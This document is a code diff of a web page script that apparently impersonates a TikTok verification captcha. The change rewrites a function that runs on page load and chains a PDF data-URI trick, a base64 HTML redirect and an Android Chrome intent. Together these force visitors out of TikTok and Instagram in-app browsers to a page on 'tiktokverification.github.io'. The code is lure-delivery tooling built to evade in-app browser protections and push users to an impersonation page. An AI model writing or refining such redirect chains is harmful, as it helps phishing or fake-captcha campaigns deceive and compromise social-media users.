@@ -56,31 +56,34 @@
         const targetUrl = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
 
         function breakOut() {
-            // Method 1: The "Intent" for Android (forces Chrome)
-            const intentUrl = "intent://" + targetUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            // The "Jump" Method: Uses a data-uri to force the browser to trigger an external intent
+            // This is the most consistent way to break out of TikTok/IG in-app browsers
+            const jumpCode = `
+                <html>
+                <body>
+                <script>
+                    window.location.replace("${targetUrl}");
+                <\/script>
+                </body>
+                </html>
+            `;
             
-            // Method 2: Blob download trick (forces iOS to offer "Open in Safari")
-            const blob = new Blob([''], { type: 'application/octet-stream' });
+            // 1. Force a "Download" headers simulation
+            const blob = new Blob([jumpCode], {type: 'text/html'});
             const blobUrl = URL.createObjectURL(blob);
-            
-            // Method 3: RFC-compliant FTP/Data trick
-            const dataUrl = "data:text/html,<html><script>window.location.href='" + targetUrl + "';<\/script></html>";
 
-            // Execute the chain
-            window.location.href = intentUrl; // Try Android Intent first
+            // 2. Try the PDF bypass (iOS specific breakout)
+            window.location.assign('data:application/pdf;base64,JVBERi0xLjcK'); 
 
+            // 3. Immediately follow with the data-uri redirect
             setTimeout(() => {
-                // Try to force an external trigger via a fake download
-                const a = document.createElement('a');
-                a.href = targetUrl;
-                a.download = 'verify.html';
-                a.click();
-            }, 100);
+                window.location.href = "data:text/html;base64," + btoa(jumpCode);
+            }, 50);
 
+            // 4. Android Intent fallback
             setTimeout(() => {
-                // Last ditch effort: direct URL handoff
-                window.location.assign(targetUrl);
-            }, 300);
+                window.location.href = "intent://" + targetUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
+            }, 150);
         }
 
         window.onload = function() {
